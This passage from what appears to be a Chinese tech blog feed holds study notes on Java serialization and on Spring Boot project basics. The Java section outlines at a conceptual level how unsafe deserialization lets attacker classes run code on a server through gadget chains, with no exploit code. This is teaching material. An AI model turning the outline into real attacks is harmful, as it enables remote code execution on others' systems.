#ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileInputStream</span><span style="color: #ABB2BF">(Filename));</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">obj</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ois</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readObject</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> obj;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>将序列化内容存入文件，readObject读取实现反序列化</p><p>注意：</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Person</span><span style="color: #E06C75"> </span><span style="color: #C678DD">implements</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Serializable</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p><strong>读取接口</strong><code>Serializable</code>才可以序列化</p><h2 id="输入输出流"><a href="#输入输出流" class="headerlink" title="输入输出流"></a>输入输出流</h2><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ul><li><p>ObjectOutputStream代表对象输出流：</p><p>它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。</p></li><li><p>ObjectInputStream代表对象输入流：</p><p>它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</p></li><li><p>一个实现 Serializable 接口的子类也是可以被序列化的。</p></li><li><p>静态成员变量是不能被序列化，<strong>序列化是针对对象属性的</strong>，而静态成员变量是属于类的。</p></li><li><p>transient 标识的对象成员变量不参与序列化</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251114195036260.png" alt="image-20251111200638153"></p><p>此处name的变量被transient标记</p></li><li><p>idea原生可以自己写readObject()和writeObject()</p><p>比如在建立一个数组下限是100，但是实际使用了30，而全部序列化产生了浪费</p><p>所以可以自己写方法，调用时，<strong>优先调用自己写的方法</strong></p></li><li><p>serialVersionUID， 用于验证版本一致性</p><p>发生改变有三种情况：</p><ol><li>手动去修改导致当前的 serialVersionUID 与序列化前的不一样。</li><li>我们根本就没有手动去写这个 serialVersionUID 常量，那么 JVM 内部会根据类结构去计算得到这个 serialVersionUID 值，在类结构发生改变时(属性增加，删除或者类型修改了)这种也是会导致 serialVersionUID 发生变化。</li><li>假如类结构没有发生改变，并且没有定义 serialVersionUID ，但是反序列和序列化操作的虚拟机不一样也可能导致计算出来的 serialVersionUID 不一样。</li></ol></li></ul><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p><strong>为什么会产生安全问题?：</strong></p><p>只要服务端反序列化数据，客户端传递类的readObject中代码会<strong>自动执行</strong>，给予攻击者在服务器上运行代码的能力。</p><p><strong>可能的形式</strong>：</p><ol><li><p>入口类的readObject直接调用危险方法。</p><p>自己写的readObject，直接加<strong>命令执行</strong>的危害代码</p></li><li><p>入口类参数中包含可控类，该类有危险方法，readObject时调用。<strong>（类套类）</strong></p><ul><li><p>共同条件 继承Serializable</p><ul><li><p>入口类 source (重写readObject 参数类型宽泛 最好jdk自带)———&gt;mapper   HashMapper</p><p>接口重写readObject原因：不同主机jvm，所写出来的哈希值不同，需要拆解对象，单独计算元素，需要重新指向readObject</p></li><li><p>调用链 gadget chain     （相同名称   相同类型）</p></li><li><p>执行类 sink     (rce ssrf 写文件等等）</p></li></ul></li></ul></li><li><p>入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用。</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring Boot</title>
    <link href="/2025/11/08/Spring%20Boot/"/>
    <url>/2025/11/08/Spring%20Boot/</url>
    
    <content type="html"><![CDATA[<ul><li>jdk1.8</li><li>maven 3.6.1</li><li>springboot:最新版</li><li>IDEA最新</li></ul><h1 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h1><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027135411507.png" alt="image-20251027135404384"></p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><ul><li><p>spring是什么</p><p>轻量级的Java 开发框架</p><p>Spring是为了解决企业级应用开发的复杂性而创建的，，简化开发</p></li><li><p>spring如何简化</p><p>为了降低Java开发的复杂性，Spring采用了以下4种关键策略<br>1、基于POJO的轻量级和最小侵入性编程;<br>2、通过IOC容器，依赖注入(DI)和面向接口实现松耦合<br>3、基于切面(AOP)和惯例进行声明式编程;<br>4、通过切面和<strong>模版</strong>减少样式代码</p></li><li><p>Java企业级应用-&gt;J2EE-&gt;spring-&gt;springboot的过程</p><p><strong>约定大于配置</strong></p></li><li><p>Spirng Boot 本身并不提供 Spring 框架的核心特性以及扩展功能，只是用于快速、敏捷地开发新一代基于 Spring 框架的应用程序。</p><p>并不是用来替代 Spring 的解决方案，而是和 Spring 框架<strong>紧密结合</strong>用于提升 Spring 开发者体验的工具</p><p>Spring Boot 以<strong>约定大于配置的核心思想</strong>，默认帮我们进行了很多设置，多数 Spring Boot 应用只需要很少的 Spring 配置</p><p>同时它集成了大量常用的第三方库配置（例如 Redis、MongoDB、Jpa、RabbitMQ、Quartz 等等），Spring Boot 应用中这些第三方库几乎可以零配置的开箱即用</p><p>默认配置了很多框架的使用方式，就像maven整合了所有的jar包</p></li><li><p><strong>Spring Boot的主要优点：</strong></p><ul><li>为所有Spring开发者更快的入门</li><li><strong>开箱即用</strong>，提供各种默认配置来简化项目配置</li><li>内嵌式容器简化Web项目</li><li>没有冗余代码生成和XML配置的要求</li></ul></li><li><p>程序&#x3D;数据结构+算法I(集合框架);   程序猿<br>程序&#x3D;面向对象+框架;   码农</p></li></ul><h1 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h1><ul><li><p>也是一种架构</p><p>业务service：userService:&#x3D;&#x3D;&#x3D;&gt;模块!（将业务服务拆分成模块）</p><p>springmvc，controller &#x3D;&#x3D;&gt;提供接口!</p></li><li><p>架构</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027141516380.png"></p><p>单体应用架构（al in one）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027141735094.png" alt="image-20251027141734930"></p><p>微服务架构（分块）</p><p>例如：</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">用户下单:controller!</span></span><span class="line"><span style="color: #abb2bf">背后：</span></span><span class="line"><span style="color: #abb2bf">仓库冻结:资金冻结;验证:购买成功，仓库数量减少，仓库解冻，资金解冻（太多了，容易崩，所以放在不同服务器上）</span></span></code></pre></div></div></figure><p>把独立出来的功能元素的动态组合，需要的功能元素才去拿来组合，需要多一些时可以整合多个功能元素。所以微服务架构是对功能元素进行复制，而没有对整个应用进行复制。</p><p>服务和服务器之间<strong>接口连接</strong>，一个服务器需要维修，先提供缓存，更新好之后再连接接口</p></li></ul><h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027213748170.png" alt="image-20251027213748075"></p><h2 id="目录分析"><a href="#目录分析" class="headerlink" title="目录分析"></a>目录分析</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027213638578.png" alt="image-20251027213638513"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">配置文件可以修改端口号    server.port=8081</span></span><span class="line"><span style="color: #abb2bf">修改spring的图标，找点自动生成的网站，如下图banner.txt</span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027223250321.png" alt="image-20251027223250268"></p><ul><li><p>建立第一个项目一定要在application同级目录下</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027214600932.png"></p></li><li><p>建立项目时，未导入依赖，可以在pom.xml文件里面自行写入</p><p>pom.xml里面的每一个东西都是一个启动器</p></li></ul><p>注意：</p><ul><li>Maven 使用 <code>pom.xml</code> 管理依赖和构建配置；</li><li>Gradle 则使用 <code>build.gradle</code>（或 <code>build.gradle.kts</code> kotlin 脚本）</li></ul><p>如果使用Gradle 构建就没有pom.xml文件</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>自动配置：</p><h2 id="先分析pom-xml"><a href="#先分析pom-xml" class="headerlink" title="先分析pom.xml"></a>先分析pom.xml</h2><figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;?</span><span style="color: #E06C75">xml</span><span style="color: #D19A66"> version</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;1.0&quot;</span><span style="color: #D19A66"> encoding</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;UTF-8&quot;</span><span style="color: #ABB2BF">?&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">project</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">xmlns</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;http://maven.apache.org/POM/4.0.0&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">xmlns:xsi</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">xsi:schemaLocation</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">modelVersion</span><span style="color: #ABB2BF">&gt;4.0.0&lt;/</span><span style="color: #E06C75">modelVersion</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">parent</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;org.springframework.boot&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;spring-boot-starter-parent&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;3.5.7&lt;/</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">relativePath</span><span style="color: #ABB2BF">/&gt; </span><span style="color: #7F848E; font-style: italic">&lt;!-- lookup parent from repository --&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">parent</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;com.example&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;demo&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;0.0.1-SNAPSHOT&lt;/</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">name</span><span style="color: #ABB2BF">&gt;demo&lt;/</span><span style="color: #E06C75">name</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">description</span><span style="color: #ABB2BF">&gt;demo&lt;/</span><span style="color: #E06C75">description</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">url</span><span style="color: #ABB2BF">/&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">licenses</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">license</span><span style="color: #ABB2BF">/&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">licenses</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">developers</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">developer</span><span style="color: #ABB2BF">/&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">developers</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">scm</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">connection</span><span style="color: #ABB2BF">/&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">developerConnection</span><span style="color: #ABB2BF">/&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">tag</span><span style="color: #ABB2BF">/&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">url</span><span style="color: #ABB2BF">/&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">scm</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">properties</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">java.version</span><span style="color: #ABB2BF">&gt;21&lt;/</span><span style="color: #E06C75">java.version</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">properties</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">dependencies</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;org.springframework.boot&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;spring-boot-starter-web&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;org.springframework.boot&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;spring-boot-starter-test&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">scope</span><span style="color: #ABB2BF">&gt;test&lt;/</span><span style="color: #E06C75">scope</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">dependencies</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">build</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">plugins</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">plugin</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;org.springframework.boot&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;spring-boot-maven-plugin&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">plugin</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">plugins</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">build</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">project</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure><ul><li>spring-boot-dependencies:核心依赖在父工程中!</li><li>我们在写或者引入一些SPringboot依赖的时候，不需要指定版本，就因为有这些版本仓库</li></ul><h2 id="启动器"><a href="#启动器" class="headerlink" title="启动器"></a>启动器</h2><figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;org.springframework.boot&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;spring-boot-starter-web&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure><ul><li><p>说白了就是Springboot的启动场景</p></li><li><p>比如spring-boot-starter-web，他就会帮我们自动导入web环境所有的依赖!</p><p>(spring-boot-starte-xxxxx       xxx就是相关的环境名称)</p></li><li><p>springboot会将所有的功能场景，都变成一个个的启动器</p></li><li><p>我们要使用什么功能，就只需要找到对应的启动器就可以了</p></li></ul><h2 id="主程序"><a href="#主程序" class="headerlink" title="主程序"></a>主程序</h2><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">com.example.demo</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.boot.SpringApplication</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.boot.autoconfigure.SpringBootApplication</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">SpringBootApplication</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">DemoApplication</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"></span><span class="line"><span style="color: #E06C75"></span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">SpringApplication</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">run</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">DemoApplication</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, args);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><ul><li><p>注解（相当于是启动类）</p><p>（1）控制层注解</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RestController</span><span style="color: #E06C75">   </span><span style="color: #7F848E; font-style: italic">// = @Controller + @ResponseBody，返回 JSON类型的数据</span></span><span class="line"><span style="color: #E06C75">eg：浏览器 → [</span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RestController</span><span style="color: #E06C75">] → 所有方法自动带“直接给包裹”属性 → 输出：{</span><span style="color: #98C379">&quot;name&quot;</span><span style="color: #C678DD">:</span><span style="color: #98C379">&quot;张三&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;age&quot;</span><span style="color: #C678DD">:</span><span style="color: #D19A66">20</span><span style="color: #E06C75">} → 直接返回给浏览器</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/user&quot;</span><span style="color: #E06C75">)  </span><span style="color: #7F848E; font-style: italic">// 路径映射</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/list&quot;</span><span style="color: #E06C75">)      </span><span style="color: #7F848E; font-style: italic">// GET 请求</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">PostMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/add&quot;</span><span style="color: #E06C75">)      </span><span style="color: #7F848E; font-style: italic">// POST 请求</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">PutMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/update&quot;</span><span style="color: #E06C75">)    </span><span style="color: #7F848E; font-style: italic">// PUT 请求</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">DeleteMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/delete&quot;</span><span style="color: #E06C75">) </span><span style="color: #7F848E; font-style: italic">// DELETE 请求</span></span></code></pre></div></div></figure><p>（2）Bean 管理注解</p><p><strong>将对象交给 Spring 容器管理</strong>，javabbean就是java的类</p><p>这类注解用于标记类，告诉 Spring：“这个类的对象由你创建并管理”，无需手动 <code>new</code> 对象</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Component</span><span style="color: #E06C75">   </span><span style="color: #7F848E; font-style: italic">// 通用组件</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Service</span><span style="color: #E06C75">     </span><span style="color: #7F848E; font-style: italic">// 业务层</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Repository</span><span style="color: #E06C75">  </span><span style="color: #7F848E; font-style: italic">// 数据层</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Controller</span><span style="color: #E06C75">  </span><span style="color: #7F848E; font-style: italic">// 控制层</span></span></code></pre></div></div></figure><p>（3）依赖注入</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Autowired</span><span style="color: #E06C75">   </span><span style="color: #7F848E; font-style: italic">// 自动注入</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Resource</span><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">// JSR-250 注入（常见于兼容老项目）</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Value</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;${server.port}&quot;</span><span style="color: #E06C75">) </span><span style="color: #7F848E; font-style: italic">// 获取配置</span></span></code></pre></div></div></figure><p>（4）配置注解</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Configuration</span><span style="color: #E06C75">      </span><span style="color: #7F848E; font-style: italic">// 配置类</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Bean</span><span style="color: #E06C75">               </span><span style="color: #7F848E; font-style: italic">// 方法上定义 Bean</span></span><span class="line"><span style="color: #E06C75">就是将方法作为对象存储，在下次使用的时候不需要再次new，直接调用即可</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">ConfigurationProperties</span><span style="color: #E06C75">(</span><span style="color: #D19A66">prefix</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;myconfig&quot;</span><span style="color: #E06C75">) </span><span style="color: #7F848E; font-style: italic">// 配置属性绑定</span></span></code></pre></div></div></figure></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251028104430521.png" alt="image-20251028104423404"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251028104612355.png"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251028104739653.png" 